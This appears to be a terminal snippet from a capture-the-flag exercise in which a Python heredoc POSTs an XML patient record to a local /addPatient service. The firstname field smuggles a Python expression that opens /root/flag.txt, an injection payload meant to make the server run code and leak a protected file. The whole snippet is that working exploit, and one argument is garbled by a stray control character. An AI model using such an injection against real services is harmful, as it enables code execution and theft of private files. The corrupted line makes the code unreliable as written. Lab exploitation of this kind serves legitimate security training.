```python
sedric@interpreter:~$ python3 - <<'EOF'
import urllib.request
payload = b"""<patient>
  <firstname>{open('/root/flag.txt').read()}</firstname>
  <lastname>X</lastname>
  <sender_app>TEST</sender_app>
  <timestamp>20250101</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>M</gender>
</patient>"""
req = urllib.request.Request("http://127.0.0.1:54321/addPatient",
                             data=payload, method="POST",
                             headers={"Content-Type": "text/plain"})
try:
    r = urllib.request.urlopen(req, time^Ct=5)
    print("STATUS:", r.status)
    print("RESPONSE:", r.read().decode(errors="replace"))
except Exception as e:
    print("ERR:", e)
EOF
```
